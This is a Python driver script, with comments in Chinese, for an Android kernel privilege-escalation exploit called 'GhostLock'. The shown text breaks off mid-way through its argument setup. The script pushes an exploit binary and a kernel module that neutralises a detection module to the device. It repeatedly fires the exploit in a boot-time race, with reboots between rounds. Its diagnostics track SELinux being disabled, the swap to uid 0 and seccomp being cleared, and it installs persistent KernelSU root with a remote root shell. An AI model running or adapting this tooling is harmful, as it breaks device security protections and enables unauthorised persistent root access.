#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ghostlock_pc.py -- 在 PC 上驱动 GhostLock（绕开 App 生命周期）

为什么能这样做
--------------
libghostlock.so 其实是 PIE 可执行文件（不是共享库：readelf 有 INTERP=/system/bin/linker64、
入口 0x2bb30），App 只是把它当 CLI 启动：

  App (GhostlockUserService.runExploit)
    → Shizuku UserService (uid 2000, Seccomp=0)
      → exec libghostlock.so --ghostlock-app-call --enable-status-record
        cwd=/data/local/tmp/ghostlock-app  env: HOME/TMPDIR/GHOSTLOCK_HOME/GHOSTLOCK_KSU_LOG
        stdin: u32 big-endian 长度 + profile blob

`adb shell` 本身就是 uid 2000 + u:r:shell:s0 + 无 seccomp 过滤（与 Shizuku UserService
的启动条件完全一致），所以整条 App/Shizuku 层可以直接用 adb 替代：

  PC → adb shell（shell 进程，不是应用进程，不受 LMK/app-freeze 影响）
     → libghostlock.so（同一二进制、同一 profile、同一环境变量）

被"杀掉进程"的原因通常是被冻在应用的 cgroup / app-freeze 里；换成 adb shell 的
session 之后，进程在 shell 的 cgroup 下，PC 断开也不会被回收（setsid 脱离）。

子命令
------
  check    体检：设备、uname -r、uid、seccomp、SELinux、ABI、与 profile 是否匹配
  setup    推送 libghostlock.so / vrpatch.ko / profile.bin / 运行脚本
  run      按次数尝试提权，日志实时回传，成功即停
  status   提权结果核验（id / getenforce / kernelsu 模块 / su -c id）
  pull-log 把设备上的日志取回本地

例子（2026-10-18 在 PD2338 / 5.15.197 上实测提权成功的路径）
---------------------------------------------------------------
  python3 ghostlock_pc.py check
  python3 ghostlock_pc.py setup --from-blob ../evidence/profile.bin --force-attack
  # 启动窗口模式才是正解（这个漏洞要抢开机 12~45 秒的窗口）
  python3 ghostlock_pc.py run --on-boot --reboot --reboots 8 \
          --per-boot 8 --window 150 --timeout 120 --poll 0.4
  python3 ghostlock_pc.py status

注意
----
* 默认入口是 `--load-prebuilt-profile <file>`（`--app-call` 才走 §1.2 的 stdin 帧）。
* `--from-blob` 推已有 blob；用 `--conf` 现场生成时，multicast 路由必须保证
  `execution.consumer.max_calls >= 1`，否则真机日志会是 `calls=0 success=0`（路由空转）。
* 更省事的入口是同目录的 `reroot.sh`（纯 bash）：`./reroot.sh` / `--no-reboot` / `--check`。
"""
import argparse
import base64
import os
import shutil
import struct
import subprocess
import sys
import tempfile
import time

ADB = os.environ.get("ADB", "adb")
DEV_DIR = "/data/local/tmp/ghostlock-app"
HERE = os.path.dirname(os.path.abspath(__file__))

MARKERS_OK = [
    "KernelSU module loaded",          # root 脚本把 KSU late-load 成功了（最硬）
    "child is root!",
    "child uid = 0",
    "handoff: root script path=",
    "child seccomp fully bypassed",
]
# root 脚本（native 内嵌）里的关键行 -> 诊断（用于失败时给结论，而不是只看"没成功"）
DIAG = [
    ("temp su unavailable", "W2 失败：没拿到 uid0，竞态没打中 → 继续刷/换绑核"),
    ("root script start uid=0", "root 脚本已以 uid0 启动（W1+W2 打通）"),
    ("SELinux already permissive", "W1 之前 SELinux 已是 permissive"),
    ("W1: SELinux", "W1 写 selinux_state.enforcing=0"),
    ("W2: cred", "W2 换 cred"),
    ("W3: TIF_SECCOMP", "W3 清 seccomp 标志"),
    ("invalid policy header", "读到的 SELinux policy 头不对（W1 未完全生效/策略被裁）"),
    ("load_policy returned success without updating SELinux status",
     "load_policy 假成功：policy 没真正替换"),
    ("fixup failed; SELinux left permissive",
     "policy 修补失败 → 不会跑 vrpatch/KSU（只有临时 root 可用）"),
    ("ksud missing", "没找到 ksud：管理器未装/包名不对 → --ksu-pkg/--kmi，或放 /data/local/tmp/ksud"),
    ("vrpatch exit=0", "vrpatch.ko 已 insmod（vr.ko 检测被中和）"),
    ("KernelSU module not loaded", "late-load 失败（KMI 是否匹配、vrpatch 是否成功）"),
    ("KernelSU module loaded", "KSU late-load 成功 → 持久 root 生效"),
    ("KernelSU already loaded", "跑之前 KSU 已在 /proc/modules 里"),
    ("script done", "root 脚本正常收尾"),
]
MARKERS_FAIL = [
    "W2 failed after",
    "no profiles matched",
    "kernel profile does not match",
]


def run(cmd, serial=None, timeout=60, check=False, binary=False):
    full = [ADB]
    if serial:
        full += ["-s", serial]
    full += cmd
    try:
        p = subprocess.run(full, capture_output=True, timeout=timeout)
    except subprocess.TimeoutExpired:
        return -1, ("", "")[0] if not binary else b"", "timeout"
    except OSError as e:
        return -2, "" if not binary else b"", str(e)
    out = p.stdout if binary else p.stdout.decode("utf-8", "replace")
    err = p.stderr.decode("utf-8", "replace")
    if check and p.returncode != 0:
        raise SystemExit("adb failed (%d): %s\n%s" % (p.returncode, " ".join(full), err))
    return p.returncode, out, err


def sh(cmd, serial=None, timeout=60):
    return run(["shell", cmd], serial=serial, timeout=timeout)


def sh_out(cmd, serial=None, timeout=60):
    rc, out, err = sh(cmd, serial=serial, timeout=timeout)
    return out.strip()


def push(local, remote, serial=None):
    rc, out, err = run(["push", local, remote], serial=serial, timeout=300)
    if rc != 0:
        raise SystemExit("push failed: %s -> %s\n%s%s" % (local, remote, out, err))
    return out.strip()


def pick_device(serial):
    rc, out, err = run(["devices"], serial=None, timeout=30)
    lines = [l for l in out.splitlines()[1:] if l.strip()]
    if not lines:
        raise SystemExit("no adb device (adb devices empty). 接上手机并开 USB 调试 / 无线调试。")
    devs = [l.split()[0] for l in lines if l.split()[1] == "device"]
    if not devs:
        raise SystemExit("adb device not in 'device' state: %s" % lines)
    if serial:
        if serial not in devs:
            raise SystemExit("serial %s not in %s" % (serial, devs))
        return serial
    if len(devs) > 1:
        raise SystemExit("multiple devices %s; pass --serial" % devs)
    return devs[0]


# ---------------------------------------------------------------------------
# check
# ---------------------------------------------------------------------------
def cmd_check(args):
    serial = pick_device(args.serial)
    g = lambda c: sh_out(c, serial=serial)
    print("serial     :", serial)
    print("uname -r   :", g("uname -r"))
    print("abi        :", g("getprop ro.product.cpu.abi"))
    print("model      :", g("getprop ro.product.model"))
    print("sdk        :", g("getprop ro.build.version.sdk"))
    print("uid        :", g("id"))
    print("selinux    :", g("getenforce 2>/dev/null || echo unknown"))
    sec = g("grep -i '^Seccomp' /proc/self/status 2>/dev/null")
    print("seccomp    :", sec or "(unreadable)")
    if sec and "Seccomp:\t0" not in sec and "Seccomp: 0" not in sec:
        print("  !! 警告: adb shell 进程带 seccomp 过滤。App 的 Shizuku 路径要求 Seccomp=0；")
        print("     若本机 adb 子进程被加了过滤，W3 阶段会失败（可先跑一次看日志）。")
    print("dir        :", g("ls -ld %s 2>/dev/null" % args.dir) or "(not created)")
    prof = "%s/profile.bin" % args.dir
    kernel = g("uname -r")
    if g("test -f %s && echo yes" % prof) != "yes":
        print("profile    : missing (run setup)")
        return 1
    lenb = g("dd if=%s bs=1 skip=12 count=2 2>/dev/null | od -An -tu1" % prof).split()
    try:
        rel_len = int(lenb[0]) + int(lenb[1]) * 256   # u16 LE @0x0c
        prel = g("dd if=%s bs=1 skip=16 count=%d 2>/dev/null" % (prof, rel_len)).strip()
    except Exception:
        print("profile    : present (header unreadable)")
        return 1
    print("profile    : %s (release=%r)" % (prof, prel))
    if prel == kernel:
        print("match      : YES  (uname -r == profile.release)")
    else:
        print("match      : *** NO ***")
        print("  设备 uname -r : %r" % kernel)
        print("  profile release: %r" % prel)
        print("  !! offset 不匹配时漏洞打失败会 panic 重启（你的设备会自行恢复），")
        print("     但正确的 .conf 就在 assets/kernel_profiles/<uname -r>.conf。")
        return 3
    return 0


# ---------------------------------------------------------------------------
# setup
# ---------------------------------------------------------------------------
GLRUN = r"""#!/system/bin/sh
# generated by ghostlock_pc.py -- 设备端运行器（不要手改）
H="%(dir)s"
cd "$H" || exit 90
TS=${GL_RUN_ID:-$(date +%%s 2>/dev/null || echo 0)}
LOG="$H/native-$TS.log"
RC="$H/native-$TS.rc"
export HOME="$H"
export TMPDIR="$H"
export GHOSTLOCK_HOME="$H"
export GHOSTLOCK_VRPATCH_KO="$H/vrpatch.ko"
export GHOSTLOCK_KSU_LOG="$H/ksu-$TS.log"
%(extra_env)s
{
  echo "=== ghostlock-pc run $TS"
  echo "uname : $(uname -r)"
  echo "id    : $(id)"
  echo "seccomp: $(grep -i '^Seccomp' /proc/self/status)"
  echo "domain: $(cat /proc/self/attr/current 2>/dev/null)"
  echo "selinux: $(getenforce 2>/dev/null)"
  echo "argv  : %(argv)s"
} > "$LOG" 2>&1
%(invoke)s >> "$LOG" 2>&1
echo "=== native exit=$?" >> "$LOG"
echo "$TS" > "$H/.last_ts"
echo "done" > "$RC"
"""


def render_glrun(args, dev):
    extra = []
    if args.force_attack:
        extra.append("--force-attack")
    if args.dump_kernel_log:
        extra.append("--dump-kernel-log %s" % args.dump_kernel_log)
    env_lines = []
    if args.main_cpu is not None:
        env_lines.append('export GHOSTLOCK_MAIN_CPU="%d"' % args.main_cpu)
    if args.consumer_cpu is not None:
        env_lines.append('export GHOSTLOCK_CONSUMER_CPU="%d"' % args.consumer_cpu)
    if args.ksu_enforce is not None:
        env_lines.append('export GHOSTLOCK_KSU_ENFORCE="%d"' % args.ksu_enforce)
    if args.vr_tag_b is not None:
        env_lines.append('export GHOSTLOCK_VR_TAG_B="%d"' % args.vr_tag_b)
    pf = getattr(args, "profile_file", None) or "profile.bin"
    if not getattr(args, "app_call", False):
        # 备用入口：把同一份 blob 当文件读（native 的另一个 entrypoint）
        invoke = '"$H/libghostlock.so" --load-prebuilt-profile "$H/%s" %s' % (pf, " ".join(extra))
        argv = "libghostlock.so --load-prebuilt-profile %s " % pf + " ".join(extra)
    else:
        # 默认：与 App (GhostlockUserService) 完全一致的 stdin 帧
        #   stdin = u32 big-endian 长度 + profile blob
        invoke = ('cat "$H/profile.len" "$H/%s" | "$H/libghostlock.so" '
                  '--ghostlock-app-call %s' % (pf, " ".join(extra)))
        argv = "libghostlock.so --ghostlock-app-call " + " ".join(extra)
    return GLRUN % {"dir": dev, "extra": " ".join(extra),
                    "extra_env": "\n".join(env_lines),
                    "invoke": invoke, "argv": argv}


def stage_profile(args, out_path):
    """把要推给设备的 blob 准备好：--from-blob 直接拷，否则从 .conf 生成。"""
    src = getattr(args, "from_blob", None)
    if src:
        if not os.path.isfile(src):
            raise SystemExit("--from-blob: %s 不存在" % src)
        shutil.copyfile(src, out_path)
        return 0
    if not getattr(args, "conf", None):
        raise SystemExit("需要 --conf <.conf> 或 --from-blob <profile.bin>")
    return build_profile(args, out_path)


def build_profile(args, out_path):
    prof_py = os.path.join(HERE, "ghostlock_profile.py")
    cmd = [sys.executable, prof_py, "build", "-c", args.conf, "-o", out_path]
    for b in args.base:
        cmd += ["-b", b]
    if args.release_override:
        cmd += ["--release-override", args.release_override]
    if args.route:
        cmd += ["--route", args.route]
    return subprocess.call(cmd)


def cmd_setup(args):
    dev = args.dir
    if args.dry_run:
        tmp = tempfile.mkdtemp(prefix="glprof.")
        blob = os.path.join(tmp, "profile.bin")
        if stage_profile(args, blob) != 0:
            raise SystemExit("profile build failed")
        print(render_glrun(args, dev))
        with open(blob, "rb") as f:
            print("# profile.bin = %d bytes" % len(f.read()))
        shutil.rmtree(tmp, ignore_errors=True)
        return 0

    serial = pick_device(args.serial)

    if not sh_out("mkdir -p %s && echo ok" % dev, serial=serial).endswith("ok"):
        raise SystemExit("cannot create %s" % dev)

    push(args.bin, dev + "/libghostlock.so", serial=serial)
    sh_out("chmod 755 %s/libghostlock.so" % dev, serial=serial)
    print("pushed libghostlock.so")

    if args.ko:
        push(args.ko, dev + "/vrpatch.ko", serial=serial)
        sh_out("chmod 644 %s/vrpatch.ko" % dev, serial=serial)
        print("pushed vrpatch.ko")
    else:
        print("no vrpatch.ko given -> 只做临时 root，不会 insmod vrpatch（KSU 阶段很可能失败）")

    # --- profile blob ---
    tmp = tempfile.mkdtemp(prefix="glprof.")
    blob = os.path.join(tmp, "profile.bin")
    if stage_profile(args, blob) != 0:
        raise SystemExit("profile staging failed")
    with open(blob, "rb") as f:
        data = f.read()
    with open(os.path.join(tmp, "profile.len"), "wb") as f:
        f.write(struct.pack(">I", len(data)))
    pfname = getattr(args, "profile_file", None) or "profile.bin"
    push(blob, dev + "/" + pfname, serial=serial)
    push(os.path.join(tmp, "profile.len"), dev + "/profile.len", serial=serial)
    shutil.rmtree(tmp, ignore_errors=True)
    print("pushed profile.bin (%d bytes)" % len(data))

    # --- device runner ---
    script = render_glrun(args, dev)
    local = os.path.join(tempfile.mkdtemp(prefix="glrun."), "glrun.sh")
    with open(local, "w", newline="\n") as f:
        f.write(script)
    push(local, dev + "/glrun.sh", serial=serial)
    sh_out("chmod 755 %s/glrun.sh" % dev, serial=serial)
    print("pushed glrun.sh")
    if args.ksu_pkg:
        sh_out("printf '%%s' '%s' > %s/.gl_ksu_pkg" % (args.ksu_pkg, dev), serial=serial)
        print("wrote .gl_ksu_pkg = %s" % args.ksu_pkg)
    if args.kmi:
        sh_out("printf '%%s' '%s' > %s/.gl_kmi" % (args.kmi, dev), serial=serial)
        print("wrote .gl_kmi = %s" % args.kmi)
    print("\nsetup done. next:  python3 %s run --serial %s" % (sys.argv[0], serial))
    return 0


# ---------------------------------------------------------------------------
# run
# ---------------------------------------------------------------------------
def read_log(serial, path, offset):
    rc, out, err = sh("wc -c < %s 2>/dev/null" % path, serial=serial)
    try:
        size = int(out.strip().split()[0])
    except Exception:
        return offset, ""
    if size <= offset:
        return offset, ""
    rc, out, err = sh("tail -c +%d %s" % (offset + 1, path), serial=serial, timeout=60)
    return size, out


def device_present(serial):
    """adb 'device' 状态还不够：重启过程中 adbd 会先出现但 shell 还 close。"""
    rc, out, err = run(["devices"], serial=None, timeout=30)
    listed = False
    for line in out.splitlines()[1:]:
        parts = line.split()
        if len(parts) >= 2 and parts[1] == "device":
            if serial is None or parts[0] == serial:
                listed = True
    if not listed:
        return False
    rc, out, err = sh("echo ping", serial=serial, timeout=15)
    return "ping" in out


def wait_device(serial, timeout):
    """等设备回来（漏洞打失败会 panic/重启并自行恢复，这是正常失败路径）。"""
    t0 = time.time()
    while time.time() - t0 < timeout:
        if device_present(serial):
            # 起来后再确认 adb shell 可用
            rc, out, err = sh("echo up", serial=serial, timeout=20)
            if "up" in out:
                return True
        time.sleep(3)
    return False



# ---------------------------------------------------------------------------
# 启动窗口模式（这个漏洞的失败模式是"抢不过开机服务"，所以按 uptime 窗口刷）
# ---------------------------------------------------------------------------
def uptime_s(serial):
    out = sh_out("cut -d' ' -f1 /proc/uptime 2>/dev/null", serial=serial, timeout=8)
    try:
        return float(out.split()[0])
    except Exception:
        return None


def wait_fast(serial, timeout):
    """重启后尽快返回：只看 `adb shell` 能不能跑（比 adb devices 更准）。"""
    t0 = time.time()
    while time.time() - t0 < timeout:
        rc, out, err = sh("echo up", serial=serial, timeout=4)
        if "up" in out:
            return True
        time.sleep(0.4)
    return False


def cmd_run_boot(args):
    serial = pick_device(args.serial)
    dev = args.dir
    if sh_out("test -x %s/libghostlock.so && echo y" % dev, serial=serial) != "y":
        raise SystemExit("libghostlock.so not installed (run setup)")
    if sh_out("test -f %s/glrun.sh && echo y" % dev, serial=serial) != "y":
        raise SystemExit("glrun.sh missing (run setup)")

    rounds = 0
    already = False
    while rounds < args.reboots:
        rounds += 1
        if args.reboot and not already:
            print("\n===== round %d/%d: reboot =====" % (rounds, args.reboots))
            run(["reboot"], serial=serial, timeout=20)
            # 等它真的掉线，再等回来
            t0 = time.time()
            while time.time() - t0 < 30:
                rc, out, err = sh("echo up", serial=serial, timeout=4)
                if "up" not in out:
                    break
                time.sleep(0.3)
        elif already:
            print("\n===== round %d/%d: 设备自己重启中，直接等 =====" % (rounds, args.reboots))
        else:
            print("\n===== round %d/%d: 等设备就绪 =====" % (rounds, args.reboots))
        already = False
        if not wait_fast(serial, args.boot_wait):
            print("[!] %ds 内没等到可用的 adb shell" % args.boot_wait)
            continue

        up = uptime_s(serial)
        print("[i] 拿到 shell 时 uptime=%s s" % ("?" if up is None else "%.1f" % up))

        n = 0
        while n < args.per_boot:
            up = uptime_s(serial)
            if up is not None and up > args.window:
                print("[i] uptime %.0fs 已超出窗口 %ds，准备下一轮" % (up, args.window))
                break
            n += 1
            up_txt = "?" if up is None else "%.1f" % up
            print("\n---- boot-attempt %d (uptime %ss) ----" % (n, up_txt))
            ts = "%d-%d-%d" % (int(time.time()), rounds, n)
            logp = "%s/native-%s.log" % (dev, ts)
            rcp = "%s/native-%s.rc" % (dev, ts)
            ksulog = "%s/ksu-%s.log" % (dev, ts)
            launch = ("cd %s && GL_RUN_ID=%s setsid sh %s/glrun.sh </dev/null >/dev/null 2>&1 & "
                      "echo launched" % (dev, ts, dev))
            rc, out, err = sh(launch, serial=serial, timeout=25)
            if "launched" not in out:
                # 回显没回来不代表没跑起来：看日志在不在
                if sh_out("test -f %s && echo y" % logp, serial=serial) == "y":
                    print("[i] 发射回显超时，但日志已出现 —— 继续盯")
                else:
                    print("[!] 发射失败（设备可能在重启），回上一级")
                    break

            offset, koffset, success, lost, appeared = 0, 0, False, False, False
            deadline = time.time() + args.timeout
            t_launch = time.time()
            buf, kbuf = "", ""
            while time.time() < deadline:
                time.sleep(args.poll)
                new_off, chunk = read_log(serial, logp, offset)
                if chunk:
                    appeared = True
                    offset = new_off
                    buf += chunk
                    sys.stdout.write(chunk)
                    sys.stdout.flush()
                # root 脚本的日志单独一份，成功信号在这里
                kn, kchunk = read_log(serial, ksulog, koffset)
                if kchunk:
                    koffset = kn
                    kbuf += kchunk
                    sys.stdout.write("[ksu] " + kchunk)
                    sys.stdout.flush()
                if "KernelSU module loaded" in kbuf:
                    success = True
                    print("\n[+] KSU late-load 成功")
                    break
                if not appeared and time.time() - t_launch > 8:
                    print("\n[!] 日志没出现（/data 还没挂好 或 脚本没起来），重试")
                    break
                if any(m in buf for m in MARKERS_OK):
                    success = True
                if sh_out("test -f %s && echo y" % rcp, serial=serial) == "y":
                    _, tailtxt = read_log(serial, logp, offset)
                    if tailtxt:
                        sys.stdout.write(tailtxt)
                    break
                if not chunk:
                    rc2, o2, e2 = sh("echo alive", serial=serial, timeout=5)
                    if "alive" not in o2:
                        lost = True
                        print("\n[!] 设备掉线（panic/重启）")
                        break
            else:
                print("\n[!] 本次观察超时 %ds" % args.timeout)

            diag = [(ln, why) for key, why in DIAG for ln in (buf + "\n" + kbuf).splitlines() if key in ln]
            if diag:
                print("--- 阶段诊断 ---")
                seen = set()
                for ln, why in diag:
                    if why in seen:
                        continue
                    seen.add(why)
                    print("  %-56s %s" % (ln.strip()[-56:], why))

            if lost:
                already = True
                break
            if success:
                print("\n[+] 成功标记命中，核验中（不要动设备）...")
                time.sleep(2)
                st = cmd_status(args)
                if st.get("root"):
                    print("[+] ROOT CONFIRMED —— 停止，别再重启")
                    return 0
                print("[i] 已 late-load 但 su 还没通（KSU 管理器需要授权/刷新）")
                return 0
        # 本轮结束
        if rounds < args.reboots and not args.reboot:
            print("[i] 设备没重启但窗口已过；请手动重启后再来，或加 --reboot")
            break
    print("\n[x] 所有轮次用完")
    return 1


def cmd_run(args):
    serial = pick_device(args.serial)
    dev = args.dir
    if sh_out("test -x %s/libghostlock.so && echo y" % dev, serial=serial) != "y":
        raise SystemExit("libghostlock.so not installed in %s (run setup)" % dev)
    if sh_out("test -f %s/glrun.sh && echo y" % dev, serial=serial) != "y":
        raise SystemExit("glrun.sh missing (run setup)")

    for attempt in range(1, args.attempts + 1):
        print("\n########## attempt %d/%d ##########" % (attempt, args.attempts))

        # 上一轮若还在跑，等它自己结束（不杀进程）
        waited = 0
        while True:
            c = sh_out("ps -A 2>/dev/null | grep -c libghostlock", serial=serial)
            if c in ("", "0"):
                break
            if waited >= args.wait_stale:
                print("[!] 上一轮 libghostlock 仍在运行（>%ds），跳过本次" % args.wait_stale)
                break
            time.sleep(2)
            waited += 2
        if waited:
            print("[i] 等待上一轮结束 %ds" % waited)

        ts = "%d-%d" % (int(time.time()), attempt)
        logp = "%s/native-%s.log" % (dev, ts)
        rcp = "%s/native-%s.rc" % (dev, ts)
        boot_id_before = sh_out("cat /proc/sys/kernel/random/boot_id 2>/dev/null", serial=serial)

        launch = ("cd %s && GL_RUN_ID=%s setsid sh %s/glrun.sh </dev/null >/dev/null 2>&1 & "
                  "echo launched" % (dev, ts, dev))
        rc, out, err = sh(launch, serial=serial, timeout=30)
        if "launched" not in out:
            print("[!] 启动输出异常:", out.strip(), err.strip())
            if not wait_device(serial, args.reboot_wait):
                raise SystemExit("设备在 %ds 内没回来，停止。" % args.reboot_wait)
            continue

        offset, success = 0, False
        deadline = time.time() + args.timeout
        started = time.time()
        buf = ""
        lost = False
        while time.time() < deadline:
            time.sleep(args.poll)
            new_off, chunk = read_log(serial, logp, offset)
            if chunk:
                offset = new_off
                buf += chunk
                sys.stdout.write(chunk)
                sys.stdout.flush()
            elif not device_present(serial):
                lost = True
                print("\n[!] 设备掉线：多半是漏洞打失败触发 panic/重启（正常失败路径）")
                break
            if any(m in buf for m in MARKERS_OK):
                success = True
                if args.quick and "handoff: root script path=" in buf:
                    break
            if sh_out("test -f %s && echo y" % rcp, serial=serial) == "y":
                _, tailtxt = read_log(serial, logp, offset)
                if tailtxt:
                    sys.stdout.write(tailtxt)
                break
        else:
            print("\n[!] 本次观察超时 %ds" % args.timeout)

        if lost:
            if not wait_device(serial, args.reboot_wait):
                raise SystemExit("设备在 %ds 内没回来，停止。" % args.reboot_wait)
            print("[i] 设备已回来，继续")
            continue

        # 正常情况下也确认一次设备状态；boot_id 变化只做提示
        if not device_present(serial):
            print("[i] 设备不在线，等待恢复...")
            if not wait_device(serial, args.reboot_wait):
                raise SystemExit("设备在 %ds 内没回来，停止。" % args.reboot_wait)
            continue
        boot_id_after = sh_out("cat /proc/sys/kernel/random/boot_id 2>/dev/null", serial=serial)
        if boot_id_before and boot_id_after and boot_id_before != boot_id_after:
            print("[i] boot_id 变化：本轮期间设备重启过（失败已自动恢复）")

        # 从本轮日志里给出阶段诊断
        diag = [(ln, why) for key, why in DIAG for ln in buf.splitlines() if key in ln]
        if diag:
            print("\n--- 阶段诊断 ---")
            seen = set()
            for ln, why in diag:
                if why in seen:
                    continue
                seen.add(why)
                print("  %-58s %s" % (ln.strip()[:58], why))

        if success:
            print("\n[+] 命中成功标记，核验中...")
            st = cmd_status(args)
            if st.get("root"):
                print("[+] ROOT CONFIRMED (attempt %d)" % attempt)
                return 0
            print("[i] 有成功标记但尚未确认 root（KSU late-load 可能仍在跑；稍后 status 再看）")
            if args.stop_on_marker:
                return 0
        else:
            print("\n[-] 本次无成功标记（用时 %ds）" % int(time.time() - started))

        if attempt < args.attempts:
            time.sleep(args.gap)
    print("\n[x] 所有尝试用完")
    return 1


# ---------------------------------------------------------------------------
# status
# ---------------------------------------------------------------------------
def cmd_status(args):
    serial = pick_device(args.serial)
    g = lambda c: sh_out(c, serial=serial)
    res = {}
    res["id"] = g("id")
    res["selinux"] = g("getenforce 2>/dev/null || echo unknown")
    res["modules"] = g("cat /proc/modules 2>/dev/null | grep -i kernelsu || echo '(none / unreadable)'")
    res["su"] = g("su -c id 2>/dev/null || echo '(su failed)'")
    res["ksud"] = g("ls -l /data/adb/ksu/bin/ksud 2>/dev/null || echo '(no ksud)'")
    res["ksulog"] = g("L=$(ls -t %s/ksu-*.log 2>/dev/null | head -1); "
                      "[ -n \"$L\" ] && { echo \"== $L\"; tail -n 25 \"$L\"; } "
                      "|| echo '(no ksu log)'" % DEV_DIR)
    print("id        :", res["id"])
    print("selinux   :", res["selinux"])
    print("kernelsu  :", res["modules"])
    print("ksud      :", res["ksud"])
    print("su -c id  :", res["su"])
    print("--- KSU log tail ---")
    print(res["ksulog"])
    root = "uid=0" in res["su"] or "uid=0(root)" in res["id"]
    res["root"] = root
    print("root      :", "YES" if root else "NO")
    if root:
        print("\n提示: su 是否长期可用取决于 KernelSU 模块是否 late-load 成功；")
        print("      'kernelsu' 行出现在 /proc/modules 里才算持久化生效。")
    return res


# ---------------------------------------------------------------------------
# pull-log
# ---------------------------------------------------------------------------
def cmd_pull_log(args):
    serial = pick_device(args.serial)
    out = args.out or os.path.join(os.getcwd(), "ghostlock-logs")
    os.makedirs(out, exist_ok=True)
    rc, listing, err = sh("ls %s/*.log %s/*.rc 2>/dev/null" % (args.dir, args.dir), serial=serial)
    files = [l.strip() for l in listing.splitlines() if l.strip()]
    if not files:
        print("no logs on device")
        return 1
    for f in files:
        name = os.path.basename(f)
        run(["pull", f, os.path.join(out, name)], serial=serial, timeout=120)
    print("pulled %d files -> %s" % (len(files), out))
    return 0


def gl_out_offset(serial, dev):
    v = sh_out("wc -c < %s/.gl_out 2>/dev/null || echo 0" % dev, serial=serial)
    try:
        return int(v.strip().split()[0])
    except Exception:
        return 0


def gl_exec(serial, dev, cmd, timeout=60):
    """走 libghostlock 写的 root 调试终端：$HOME/.gl_cmd -> $HOME/.gl_out"""
    before = gl_out_offset(serial, dev)
    b64 = base64.b64encode(cmd.encode()).decode()
    sh("echo %s | base64 -d > %s/.gl_cmd" % (b64, dev), serial=serial)
    t0 = time.time()
    last = before
    stable = 0
    while time.time() - t0 < timeout:
        time.sleep(0.4)
        cur = gl_out_offset(serial, dev)
        if cur > last:
            stable = 0
            last = cur
            # 再等一小会看是否还在增长
            time.sleep(0.6)
            cur2 = gl_out_offset(serial, dev)
            if cur2 == cur:
                stable = 1
                break
            last = cur2
        elif cur > before:
            stable += 1
            if stable >= 2:
                break
    if last <= before:
        return None
    rc, out, err = sh("tail -c +%d %s/.gl_out" % (before + 1, dev), serial=serial)
    return out


def cmd_exec(args):
    serial = pick_device(args.serial)
    argv = list(getattr(args, "argv_", []) or [])
    if argv and argv[0] == "--":
        argv = argv[1:]          # argparse REMAINDER keeps the separator
    cmd = " ".join(argv)
    out = gl_exec(serial, args.dir, cmd, timeout=args.timeout)
    if out is None:
        print("[!] 没有输出：root 调试终端没在跑（说明 W2 还没拿到 uid0，或进程已退出）",
              file=sys.stderr)
        return 1
    sys.stdout.write(out)
    return 0


def cmd_shell(args):
    serial = pick_device(args.serial)
    print("root 调试终端 -> %s/.gl_out（exit/Ctrl-D 退出）" % args.dir)
    while True:
        try:
            line = input("gl-root# " if sys.stdin.isatty() else "")
        except EOFError:
            break
        if not line.strip():
            continue
        if line.strip() in ("exit", "quit"):
            break
        out = gl_exec(serial, args.dir, line.strip(), timeout=args.timeout)
        print(out if out is not None else "[!] no output")


def main():
    common = argparse.ArgumentParser(add_help=False)
    common.add_argument("--serial", default=None, help="adb serial (-s)")
    common.add_argument("--dir", default=DEV_DIR, help="device working dir (default %s)" % DEV_DIR)

    ap = argparse.ArgumentParser(description="GhostLock PC driver (adb, no app lifecycle)")
    sub = ap.add_subparsers(dest="cmd", required=True)

    sub.add_parser("check", parents=[common])

    s = sub.add_parser("setup", parents=[common])
    s.add_argument("--bin", default=os.path.join(HERE, "..", "apkout/lib/arm64-v8a/libghostlock.so"))
    s.add_argument("--ko", default=os.path.join(HERE, "..", "apkout/assets/modules/vrpatch.ko"))
    s.add_argument("--conf", default=None,
                   help="HOCON 配置；与 --from-blob 二选一")
    s.add_argument("--from-blob", default=None,
                   help="直接推一份已有 profile blob（推荐：用 evidence/profile.bin 那份已验证的）")
    s.add_argument("--base", action="append", default=[])
    s.add_argument("--release-override", default=None)
    s.add_argument("--route", default=None,
                   choices=["tcp_zerocopy", "select_stack", "multicast_waiter"])
    s.add_argument("--force-attack", action="store_true")
    s.add_argument("--dump-kernel-log", default=None)
    s.add_argument("--main-cpu", type=int, default=None)
    s.add_argument("--consumer-cpu", type=int, default=None)
    s.add_argument("--ksu-enforce", type=int, default=None,
                   help="9=只做临时 root（vrpatch 后停）；0=最后转 permissive")
    s.add_argument("--vr-tag-b", type=int, default=None)
    s.add_argument("--ksu-pkg", default=None,
                   help="KernelSU 管理器包名，写进 .gl_ksu_pkg（脚本用它定位 libksud.so）")
    s.add_argument("--kmi", default=None,
                   help="KMI 版本，写进 .gl_kmi（默认 android13-5.15）")
    s.add_argument("--dry-run", action="store_true", help="只生成并打印设备端脚本，不碰设备")
    s.add_argument("--profile-file", default=None,
                   help="设备上要用的 blob 文件名（默认 profile.bin，可切 profile-a.bin 做对照）")
    s.add_argument("--prebuilt", action="store_true",
                   help="（已默认）--load-prebuilt-profile 入口，实测可用")
    s.add_argument("--app-call", action="store_true",
                   help="改用与 App 一致的 stdin 帧入口（--ghostlock-app-call，真机未验证）")

    r = sub.add_parser("run", parents=[common])
    r.add_argument("--attempts", type=int, default=10)
    r.add_argument("--timeout", type=int, default=900, help="每次尝试最长秒数")
    r.add_argument("--poll", type=float, default=1.5)
    r.add_argument("--gap", type=int, default=5, help="两次尝试间隔秒")
    r.add_argument("--quick", action="store_true", help="看到 handoff 就提前结束本次观察")
    r.add_argument("--stop-on-marker", action="store_true")
    r.add_argument("--wait-stale", type=int, default=120,
                   help="上一轮未结束时最多等多少秒（不杀进程）")
    r.add_argument("--reboot-wait", type=int, default=240,
                   help="失败导致重启后，等设备回来的最长秒数")
    r.add_argument("--on-boot", action="store_true",
                   help="启动窗口模式：每轮重启后立刻发射，窗口内连刷（这个漏洞的正解）")
    r.add_argument("--reboot", action="store_true", help="每轮开始由 driver 主动 adb reboot")
    r.add_argument("--reboots", type=int, default=20, help="轮数(每次启动=1轮)")
    r.add_argument("--per-boot", type=int, default=6, help="每轮启动窗口内最多发射几次")
    r.add_argument("--window", type=int, default=90, help="启动窗口：uptime 超过这么多秒就不再刷")
    r.add_argument("--boot-wait", type=int, default=300, help="重启后等 adb shell 可用的最长秒数")
    r.add_argument("--profile-file", default=None, help="用哪个 blob（默认 profile.bin）")

    sub.add_parser("status", parents=[common])

    p = sub.add_parser("pull-log", parents=[common])
    p.add_argument("--out", default=None)

    e = sub.add_parser("exec", parents=[common],
